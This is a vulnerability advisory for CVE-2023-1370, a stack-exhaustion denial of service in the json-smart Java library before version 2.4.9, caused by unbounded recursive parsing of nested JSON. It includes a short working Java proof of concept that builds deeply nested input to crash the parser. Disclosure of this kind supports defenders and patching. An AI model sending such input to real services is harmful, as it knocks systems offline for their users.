---
description: CVE-2023-1370 High severity. Stack exhaustion in json-smart leads to denial of service when parsing malformed JSON
title: json-smart Stack exhaustion DoS
date_published: "2023-03-13"
last_updated: "2023-03-13"
xray_id: XRAY-427633
vul_id: CVE-2023-1370
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Stack exhaustion in json-smart leads to denial of service when parsing malformed JSON

## Component

net.minidev:json-smart

## Affected versions

(,2.4.9)

## Description

[Json-smart](https://netplex.github.io/json-smart/) is a performance focused, JSON processor lib.
When reaching a `[` or `{` character in the JSON input, the code parses an array or an object respectively.
It was discovered that the code does not have any limit to the nesting of such arrays or objects. Since the parsing of nested arrays and objects is done recursively, nesting too many of them can cause a stack exhaustion (stack overflow) and crash the software.

## PoC

The following code will raise a `StackOverflowError`:
```java
StringBuilder s = new StringBuilder();
for (int i = 0; i < 10000 ; i++) {
  s.append("{\"a\":");
}
s.append("1");
for (int i = 0; i < 10000 ; i++) {
  s.append("}");
}
JSONParser p = new JSONParser(JSONParser.MODE_JSON_SIMPLE);
p.parse(s.toString());
```


## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Fix commit](https://github.com/netplex/json-smart-v2/commit/5b3205d051952d3100aa0db1535f6ba6226bd87a)

